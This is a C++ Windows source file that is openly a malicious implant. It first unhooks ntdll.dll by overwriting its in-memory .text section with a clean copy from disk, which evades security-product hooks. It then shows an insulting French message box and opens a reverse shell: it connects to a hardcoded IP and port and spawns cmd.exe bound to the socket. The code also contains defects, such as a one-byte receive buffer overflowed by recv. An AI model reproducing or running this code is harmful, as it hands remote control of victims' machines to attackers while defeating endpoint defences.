#include <iostream>
#include <winternl.h>
#include <psapi.h>
#include <winsock2.h>
#include <winuser.h>
#include <windows.h> 
#include <tchar.h>
#include <string>
#define DEFAULT_BUFLEN 512

using namespace std;

WSADATA wsaData;
SOCKET wsock;
struct sockaddr_in sock_addr;
STARTUPINFO si;
PROCESS_INFORMATION pi;
int val;
char recvbuf[] = "";

int compare_one(char tab[], char* cp) {
	for (size_t i = 0; i < sizeof(cp) + 1; i++) {
		if (tab[i] != cp[i]) {
			return -1;
		}
	}
	return 1;
}


int main() {

	cout << "Entered DLL Unhooking phase" << endl;

	// HANDLE ON CURR PROCESS
	HANDLE process = GetCurrentProcess();

	// HANDLE ON NTDLL.dll MODULE
	HMODULE ntdll_module = GetModuleHandleA("ntdll.dll");

	// EMPTY MODULE INFO
	MODULEINFO module_info = {};


	// process == A handle to the process that contains the module.
	// module_info will receive the information about the MODULE.
	GetModuleInformation(process, ntdll_module, &module_info, sizeof(module_info));


	// LPVOID Pointeur vers n'importe quel type
	LPVOID ntdll_Base_Address = (LPVOID)module_info.lpBaseOfDll;
	

	// ------------------------- MAPPING SECTION -------------------------
	// We fetch ntdll.dll from windows and get a handle on the created file
	// You can imagine MapViewOfFile as a malloc+memcpy of the file you are opening, nothing more

	HANDLE ntdll_File = CreateFileA("c:\\windows\\system32\\ntdll.dll", GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
	HANDLE ntdll_Mapping = CreateFileMapping(ntdll_File, NULL, PAGE_READONLY | SEC_IMAGE, 0, 0, NULL);
	LPVOID ntdllMappingAddress = MapViewOfFile(ntdll_Mapping, FILE_MAP_READ, 0, 0, 0);

	// -------------------------------------------------------------------
	
	// Base du DOS HEADER 
	PIMAGE_DOS_HEADER hookedDosHeader = (PIMAGE_DOS_HEADER)ntdll_Base_Address;
	// Base DOS HEADER + File address of new exe header (e_lfanew)
	PIMAGE_NT_HEADERS hookedNtHeader = (PIMAGE_NT_HEADERS)((DWORD_PTR) ntdll_Base_Address + 0xE0); // 0xE0 = LFANEW for ntdll.dll

	cout << hex << hookedNtHeader->Signature << endl;
	cout << module_info.lpBaseOfDll << "\n\n" << endl;

	for (WORD i = 0; i < hookedNtHeader->FileHeader.NumberOfSections; i++) {

		PIMAGE_SECTION_HEADER hooked_section_header = (PIMAGE_SECTION_HEADER)((DWORD_PTR)IMAGE_FIRST_SECTION(hookedNtHeader) 
			+ ((DWORD_PTR)IMAGE_SIZEOF_SECTION_HEADER * i));

		cout << hooked_section_header->Name << endl;

		if (!strcmp((char*)hooked_section_header->Name, (char*)".text")) { // if it returns 0
			DWORD old_dll_protection = 0;
			
			/*
			BOOL VirtualProtect(
			  [in]  LPVOID lpAddress,
			  [in]  SIZE_T dwSize,
			  [in]  DWORD  flNewProtect,
			  [out] PDWORD lpflOldProtect
			);
			*/
			
			// On récupère l'ancienne protection du DLL (et on set une nouvelle protection equiv ?)
			bool is_protected = VirtualProtect(
				/*1*/	(LPVOID)((DWORD_PTR)ntdll_Base_Address + (DWORD_PTR)hooked_section_header->VirtualAddress),
				/*2*/	hooked_section_header->Misc.VirtualSize,
				/*3*/	PAGE_EXECUTE_READWRITE,
				/*4*/	&old_dll_protection
			);
			
			// On copie la section !
			memcpy(
				(LPVOID)((DWORD_PTR)ntdll_Base_Address + (DWORD_PTR)hooked_section_header->VirtualAddress),
				(LPVOID)((DWORD_PTR)ntdllMappingAddress + (DWORD_PTR)hooked_section_header->VirtualAddress),
				hooked_section_header->Misc.VirtualSize
				);

			// On remet les protections 
			is_protected = VirtualProtect(
				(LPVOID)((DWORD_PTR)ntdll_Base_Address + (DWORD_PTR)hooked_section_header->VirtualAddress),
				hooked_section_header->Misc.VirtualSize,
				old_dll_protection,
				&old_dll_protection
			);

			cout << "Map base      : " << (DWORD_PTR)ntdllMappingAddress + (DWORD_PTR)hooked_section_header->VirtualAddress << endl;
			cout << "Nouvelle base : " << (DWORD_PTR)ntdll_Base_Address + (DWORD_PTR)hooked_section_header->VirtualAddress << endl;


		}
	}

	// Nettoyage
	CloseHandle(process);
	CloseHandle(ntdll_File);
	CloseHandle(ntdll_Mapping);
	FreeLibrary(ntdll_module);

	cout << "Completed DLL Unhooking phase" << endl;

	/* ------------------------------------------------------------------------------------------------------------------------------- */

	cout << "Entered Shell phase" << endl;

	MessageBoxA(NULL, "J'ai pris le controle de ton pc fdp", "Bouuuuuuuuh !", MB_ICONERROR);

	char *ip = (char*)"172.21.137.243";
	short port = 2106;

	int init = WSAStartup(MAKEWORD(2, 2), &wsaData); // macro to init socket library

	wsock = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, (unsigned int)NULL, (unsigned int)NULL);

	sock_addr.sin_family = AF_INET;
	sock_addr.sin_port = htons(port);
	sock_addr.sin_addr.s_addr = inet_addr(ip);

	WSAConnect(wsock, (SOCKADDR*)&sock_addr, sizeof(sock_addr), NULL, NULL, NULL, NULL);

	char* text = (const char*)"[*] Shelled \n\n\n";
	val = send(wsock, text, (int)strlen(text), 0);
	cout << val << endl;

	memset(&si, 0, sizeof(si));
	si.cb = sizeof(si);
	si.dwFlags = STARTF_USESTDHANDLES;
	si.hStdInput = si.hStdOutput = si.hStdInput = si.hStdOutput = (HANDLE)wsock;

	int iResult = 0;
	do {
		iResult = recv(wsock, recvbuf, DEFAULT_BUFLEN, 0);
		if (iResult > 0) {
			if (compare_one(recvbuf, (char*)"shell") == 1) {

				char* txt = (char*)"[*] SHELL";
				val = send(wsock, txt, (int)strlen(txt), 0);
				CreateProcess(NULL, (char*)"cmd.exe", NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi);
				break;

			}
		}
		else if (iResult == 0) {
			cout << "Closed" << endl;
		}
		else {
			cout << "Failed with error: " << WSAGetLastError() << endl;
		}
	} while (iResult > 0);


	return 0;
}